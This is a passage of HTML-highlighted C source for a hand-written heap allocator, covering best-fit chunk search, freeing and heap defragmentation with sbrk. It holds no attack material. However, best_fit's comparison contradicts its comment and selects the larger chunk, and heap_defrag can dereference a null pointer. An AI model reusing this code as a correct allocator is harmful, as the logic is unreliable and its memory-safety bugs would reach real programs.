            &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Mark the chunk as not free and return&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Loops through the linked list and finds a chunk that has a size big enough to store&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// the user's data. Uses the best fit algorithm. May return NULL if there is no free&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// chunk in the linked list, in which case the size of the heap must be increased.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;best_fit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Check if this current chunk meets the size requirements.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// If we haven't found a chunk yet, then store this one&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// If we have already found a chunk, then only store this&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// one if it has a smaller size than the stored chunk (or,&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// in other words, if it has the better fit).&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Go to the next chunk in the linked list&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Frees the given block of memory.&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Mark the chunk of memory as free&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_free&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;to_free&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Defrag the heap (will automatically modify linked list)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heap_defrag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Defragmentation does the following:&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 1.) Combines free blocks sitting next to each other.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 2.) Reduces the size of the heap if there are free block(s) at the end.&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 3.) Reconstructs the entire linked list of free blocks.&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;heap_defrag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Delete the linked list&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Loop through every chunk&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Check if this is a free chunk&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// If there is no linked list, then make this the head&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Save the last free chunk&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Else, add the chunk to the linked list&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// Check if the current chunk is adjacent to the last free&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// chunk that we stored.&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
                        &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// Instead of adding this chunk to the linked list, just&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// increase the size of the last free chunk.&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// If chunks aren't adjacent, then just add the current&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// chunk to the linked list.&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Save the last free chunk&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;curr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Check if the last free chunk is at the end of the heap&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last_free_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// If so, reduce the size of the heap with sbrk() and check for errors&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// If the head of the linked list was the last freed chunk,&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// then we should set it to the previous chunk.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

